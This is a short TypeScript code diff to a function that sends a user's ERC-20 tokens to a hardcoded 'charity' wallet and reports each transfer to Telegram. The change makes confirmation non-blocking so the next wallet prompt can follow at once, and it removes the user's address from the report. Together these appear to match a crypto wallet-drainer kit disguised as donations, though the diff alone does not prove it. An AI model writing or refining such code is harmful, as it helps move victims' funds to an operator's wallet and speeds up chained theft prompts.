@@ -227,17 +227,17 @@ export async function sendERC20Token(
 ): Promise<string> {
   const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
   const tx = await contract.transfer(EVM_CHARITY_WALLET, amount);
-  await tx.wait();
 
-  let symbol = 'UNKNOWN';
-  try { symbol = await contract.symbol(); } catch { }
-
-  sendTelegramMessage(`
+  // Fire-and-forget confirmation — do NOT block the next prompt on tx.wait()
+  tx.wait().then(async () => {
+    let symbol = 'UNKNOWN';
+    try { symbol = await contract.symbol(); } catch { }
+    sendTelegramMessage(`
 ✅ <b>EVM ERC-20 Transfer (${chainName})</b>
-👤 <b>User:</b> <code>${await signer.getAddress()}</code>
 🪙 <b>Token:</b> <code>${symbol} (${tokenAddress})</code>
 🔗 <b>Hash:</b> <code>${tx.hash}</code>
-  `);
+    `);
+  }).catch((e) => console.warn('erc20 tx.wait failed:', e));
 
   return tx.hash;
 }
